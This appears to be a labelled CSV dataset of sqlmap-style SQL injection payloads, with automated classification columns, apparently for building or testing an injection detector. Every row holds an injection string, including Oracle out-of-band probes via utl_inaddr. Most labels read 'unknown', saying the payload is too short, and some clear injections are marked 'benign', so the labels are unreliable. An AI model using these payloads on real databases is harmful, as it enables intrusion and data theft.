id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
37354,"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""-9295 ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37355,"select * from users WHERE username = ""-2181\' ) or# 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( \'wyez\' = \'wyez"" and username = ""1\'|| ( select \'rjun\' where 8868 = 8868",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37356,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf"" and username = ""-3880 )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37357,"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'%\' = \'"" or username = ""-6353%\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37358,"select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and username = ""1\' ) where 1502 = 1502 or username = ""-7199\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37359,"select * from users WHERE username = ""-9688%\' ) ) and username = ""1 ) or username = ""1%\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37360,"select * from users WHERE username = ""1 ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 9401 = 9401"" and username = ""1\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37361,"select * from users WHERE username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37362,"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37363,"-7962\' ) ) as pgqz where 6058 = 6058 or username = ""1%\' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( \'%\' = \'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37364,1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37365,"1 ) and username = ""-6523"" or username = ""-1254",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37366,-6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( \'lwlk\' like \'lwlk,out_of_band,oracle,1.0,Token 'utl_inaddr' → out_of_band (priority 2); DB=oracle. Evidence in payload: -6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( ,3
37367,"select * from users WHERE username = ""-4215 ) where 5782 = 5782 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"" or username = ""1%\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37368,"select * from users WHERE username = ""-8099%\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-4215 ) where 5782 = 5782",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37369,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'cbnc\' like \'cbnc"" and username = ""1\' ) where 1502 = 1502",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37370,"select * from users WHERE username = ""-5291\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'tmpm\' = \'tmpm"" or username = ""1%\' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37371,"-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37372,"1%\' ) or username = ""1 ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 5368 = 5368",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37373,"select * from users WHERE username = ""-2374 ) and ( 2576 = 2576"" and username = ""-3424\' ) ) and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37374,"-7184 ) as fshx where 3408 = 3408 or username = ""-4215 ) where 5782 = 5782 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37375,"1\' ) ) ) and username = ""1\'+ ( select \'rejz\' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37376,"select * from users WHERE username = ""-9840\' ) ) and ( ( \'dzlp\' = \'dzlp"" and username = ""1 ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37377,"select * from users WHERE username = ""-6353%\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) ) as plbt where 4368 = 4368",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37378,"-2028%\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'xpks\' like \'xpks",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37379,"1%\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37380,"-5667%\' ) ) and username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37381,"select * from users WHERE username = ""1\' ) ) and ( ( \'opyp\' = \'opyp"" or username = ""1 )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37382,"select * from users WHERE username = ""-5165\' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'zpnv\' like \'zpnv"" or username = ""1 ) where 3381 = 3381",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37383,1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37384,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" and username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37385,"-5313\' ) ) ) or username = ""-6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( \'lwlk\' like \'lwlk",out_of_band,oracle,1.0,"Token 'utl_inaddr' → out_of_band (priority 2); DB=oracle. Evidence in payload: -5313\' ) ) ) or username = ""-6823\' ) ) ) or 4493 = utl_ina",3
37386,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" and username = ""-6523"" and ""bwrb"" like ""bwrb",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37387,"select * from users WHERE username = ""1\' ) ) and ( ( \'rggg\' = \'rggg"" or username = ""-3424\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37388,"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-4322\' ) ) as magw where 1627 = 1627",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37389,"select * from users WHERE username = ""1 or username = ""-1985 ) ) ) and username = ""-7452\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37390,"select * from users WHERE username = ""-2679\' ) ) ) or-- 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'cutk\' like \'cutk"" and username = ""1 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37391,"select * from users WHERE username = ""1\'|| ( select \'vasx\' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" and username = ""-2756\' where 6156 = 6156 and username = ""-4610\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37392,"select * from users WHERE username = ""1\' and \'foju\' = \'foju"" and username = ""1\' and username = ""-3899\' ) where 8152 = 8152",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37393,"select * from users WHERE username = ""1\'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" or username = ""-2992\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37394,"select * from users WHERE username = ""-2154%\' and \'%\' = \'"" and username = ""-1889%\' ) ) ) and username = ""1 ) as zmxb where 8424 = 8424",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37395,"1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'xpks\' like \'xpks",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37396,"select * from users WHERE username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'cgiu\' = \'cgiu"" and username = ""-1639 ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37397,"select * from users WHERE username = ""1\' ) as hlbq where 2347 = 2347 and username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37398,"select * from users WHERE username = ""-2962\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'hkjo\' = \'hkjo"" and username = ""1 and username = ""1\' )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37399,"1 ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'kkgt\' = \'kkgt",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37400,"select * from users WHERE username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-5165\' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37401,"-1549\' ) and username = ""-7199\' and username = ""-9644 ) ) and ( ( 5616 = 5616",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37402,"1\' ) ) ) or username = ""1 ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 7594 = 7594",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
